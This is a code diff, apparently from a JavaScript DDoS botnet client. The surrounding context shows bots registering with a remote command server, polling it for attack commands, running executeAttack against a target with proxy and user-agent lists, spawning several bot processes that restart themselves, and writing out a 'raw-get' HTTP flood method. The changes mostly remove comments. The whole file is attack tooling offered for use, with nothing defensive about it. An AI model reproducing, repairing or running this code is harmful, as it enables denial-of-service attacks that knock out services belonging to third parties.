@@ -6,7 +6,7 @@ const crypto = require('crypto');
 
 // ========== CONFIGURATION ==========
 const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com';
-const BOT_COUNT = parseInt(process.env.BOT_COUNT) || 5; // Number of bots to spawn
+const BOT_COUNT = parseInt(process.env.BOT_COUNT) || 5;
 const MAX_REGISTRATION_ATTEMPTS = 5;
 const HEARTBEAT_INTERVAL = 30000;
 const COMMAND_POLL_INTERVAL = 3000;
@@ -34,7 +34,7 @@ function color(text, colorCode) {
   return `${colorCode}${text}${colors.reset}`;
 }
 
-// ========== GENERATE UNIQUE BOT ID (NOT IP BASED) ==========
+// ========== GENERATE UNIQUE BOT ID ==========
 function generateBotId() {
   const hostname = os.hostname();
   const timestamp = Date.now().toString(36);
@@ -201,7 +201,7 @@ async function autoRegister() {
     const payload = { id: BOT_ID, name: BOT_NAME };
     const response = await axios.post(\`\${MASTER_SERVER}/register\`, payload);
     if (response.data.approved) {
-      log(\`Registered! (${BOT_NAME})\`, 'success');
+      log(\`Registered! (\${BOT_NAME})\`, 'success');
       botReady = true;
       setInterval(() => checkForCommands(), COMMAND_POLL_INTERVAL);
       setInterval(() => sendHeartbeat(), HEARTBEAT_INTERVAL);
@@ -291,7 +291,6 @@ function executeAttack(target, time, methods) {
       }
     });
     
-    // Handle stdout streaming without causing memory issues
     let stdoutBuffer = '';
     proc.stdout.on('data', (data) => {
       stdoutBuffer += data.toString();
@@ -323,8 +322,6 @@ function executeAttack(target, time, methods) {
   const botDir = path.join(__dirname, 'bots', BOT_ID);
   const proxyFile = path.join(botDir, 'proxy.txt');
   const uaFile = path.join(botDir, 'ua.txt');
-
-  // Ensure methods directory exists relative to bot script
   const methodsDir = path.join(__dirname, 'methods');
   
   switch(methods) {
@@ -447,10 +444,7 @@ class MultiBotController {
   createBotInstance(index) {
     const botId = generateBotId();
     const botName = this.generateBotName(index);
-    
-    // Create bot script with placeholders replaced
     const script = createBotScript(botId, botName, MASTER_SERVER);
-    
     return { id: botId, name: botName, script: script };
   }
 
@@ -458,7 +452,6 @@ class MultiBotController {
     const bot = this.createBotInstance(index);
     this.bots.push(bot);
     
-    // Write bot script to temp file
     const tempDir = path.join(this.mainDir, 'bots');
     if (!fs.existsSync(tempDir)) {
       fs.mkdirSync(tempDir, { recursive: true });
@@ -466,7 +459,6 @@ class MultiBotController {
     const tempPath = path.join(tempDir, `${bot.id}.js`);
     fs.writeFileSync(tempPath, bot.script);
     
-    // Spawn the bot process
     const proc = fork(tempPath, [], {
       detached: false,
       stdio: 'pipe',
@@ -478,7 +470,6 @@ class MultiBotController {
       }
     });
     
-    // Capture output with buffering
     let stdoutBuffer = '';
     let stderrBuffer = '';
     
@@ -508,7 +499,6 @@ class MultiBotController {
       console.log(color(`[${bot.id.slice(0,8)}] Process exited with code ${code}`, colors.yellow));
       this.botProcesses = this.botProcesses.filter(p => p.pid !== proc.pid);
       
-      // Auto-restart if still running
       if (this.isRunning) {
         console.log(color(`[${bot.id.slice(0,8)}] Restarting...`, colors.cyan));
         setTimeout(() => this.spawnBot(index), 2000);
@@ -535,7 +525,6 @@ class MultiBotController {
     
     for (let i = 0; i < BOT_COUNT; i++) {
       this.spawnBot(i);
-      // Small delay between spawns
       if (i < BOT_COUNT - 1) {
         const delay = 500 + Math.random() * 1000;
         console.log(color(`⏳ Waiting ${Math.round(delay)}ms before next spawn...`, colors.gray));
@@ -558,7 +547,6 @@ class MultiBotController {
       } catch (e) {}
     });
     
-    // Clean up temp files
     setTimeout(() => {
       try {
         const botsDir = path.join(this.mainDir, 'bots');
@@ -577,19 +565,15 @@ class MultiBotController {
   }
 
   run() {
-    // Handle shutdown
     process.on('SIGINT', () => this.stopAll());
     process.on('SIGTERM', () => this.stopAll());
     
     this.spawnAll();
     
-    // Keep alive and monitor processes
     setInterval(() => {
-      // Monitor processes
       const alive = this.botProcesses.filter(p => p.connected && !p.killed);
       if (alive.length < this.botProcesses.length && this.isRunning) {
         console.log(color(`⚠️ Some bots died (${this.botProcesses.length - alive.length}). Restarting...`, colors.yellow));
-        // Restart dead bots
         const deadIndices = [];
         this.botProcesses.forEach((proc, index) => {
           if (!proc.connected || proc.killed) {
@@ -635,7 +619,6 @@ setTimeout(() => process.exit(0), time * 1000);`;
     }
   }
   
-  // Special RAW-GET with actual functionality
   const rawGetPath = path.join(methodsDir, 'raw-get.js');
   if (!fs.existsSync(rawGetPath)) {
     const rawGetContent = `const http = require('http');
@@ -684,7 +667,6 @@ if (cluster.isMaster) {
 
 // ========== MAIN ==========
 function main() {
-  // Parse command line arguments
   let botCount = BOT_COUNT;
   let masterServer = MASTER_SERVER;
   
@@ -718,15 +700,12 @@ Example:
     }
   }
   
-  // Override config
   process.env.BOT_COUNT = botCount;
   process.env.MASTER_SERVER = masterServer;
   
-  // Setup
   setupDirectories();
   createMethodStubs();
   
-  // Start controller
   const controller = new MultiBotController();
   controller.run();
 }
